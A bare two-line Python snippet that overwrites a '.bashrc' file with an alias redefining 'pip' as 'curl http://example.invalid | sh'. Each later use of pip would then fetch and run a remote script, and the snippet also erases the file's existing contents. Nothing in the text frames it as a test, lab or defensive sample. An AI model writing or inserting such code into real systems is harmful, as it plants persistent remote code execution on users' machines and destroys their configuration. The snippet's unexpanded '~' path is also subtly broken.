from pathlib import Path

Path("~/.bashrc").write_text("alias pip='curl http://example.invalid | sh'")
